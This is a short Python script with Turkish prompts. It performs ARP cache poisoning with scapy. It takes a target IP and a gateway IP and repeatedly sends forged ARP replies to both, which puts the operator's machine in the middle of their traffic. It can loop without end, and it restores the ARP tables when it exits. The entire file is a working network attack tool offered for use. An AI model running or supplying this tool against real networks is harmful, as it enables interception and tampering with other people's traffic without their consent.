import scapy.all as scapy
import optparse as opt
import time
print("Program Started")
def input():
    parser_object = opt.OptionParser()
    parser_object.add_option("-t","--target",dest="target",help="Hedef IP Adresi")
    parser_object.add_option("-g","--gate",dest="gateway",help="Gateway IP Adresi")
    parser_object.add_option("-c","--count",dest= "count",help="Sayac (0 Yazarak Sonsuz Dongu Olusturabilirsiniz)")
    parser_object.add_option("-s","--sleep",dest="sleep",help="Paketler Arasi Bekleme (saniye.milisaniye)")
    (inputs,arguments) = parser_object.parse_args()

    if not inputs.target and not inputs.gateway:
        print("Lutfen Parametreleri Yaziniz")
    elif not inputs.target:
        print("Lutfen Hedef IP Adresini Yaziniz")
    elif not inputs.gateway:
        print("Lutfen Gateway IP Adresinizi Yaziniz")
    else:
        sending(inputs.target, inputs.gateway, inputs.count, inputs.sleep)

def sending(target_ip,gateway_ip,times,sleeping):
    if not times:
        times = int(10)
    if not sleeping:
        sleeping = float(0.5)
    t = int(times)
    s = float(sleeping)
    count = int(0)
    try:
        if (t == 0):
            while True:
                count +=1
                print ("Sended packet " , count)
                poisoning(target_ip, gateway_ip)
                poisoning(gateway_ip, target_ip)
                time.sleep(s)
        else:
            for i in range(0, t):
                count +=1
                print("Sended packet " , count)
                poisoning(target_ip, gateway_ip)
                poisoning(gateway_ip, target_ip)
                time.sleep(s)
                if(i == t-1):
                    print("Program Bitti")
                    reset(target_ip, gateway_ip)
                    reset(gateway_ip, target_ip)
    except KeyboardInterrupt:
        print("\nProgramdan Cikiliyor...")
        reset(target_ip, gateway_ip)
        reset(gateway_ip, target_ip)

def find_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    mac_adress = answered_list[0][1].hwsrc
    return mac_adress

def poisoning(target,posioned):
    target_mac = find_mac(target)
    arp_response = scapy.ARP(op=2,pdst=target,hwdst = target_mac,psrc=posioned)
    scapy.send(arp_response,verbose=False)

def reset(fooled,gateway):
    fooled_mac = find_mac(fooled)
    gateway_mac = find_mac(gateway)
    arp_response = scapy.ARP(op=2,pdst=fooled,hwdst = fooled_mac,psrc=gateway,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)

input()
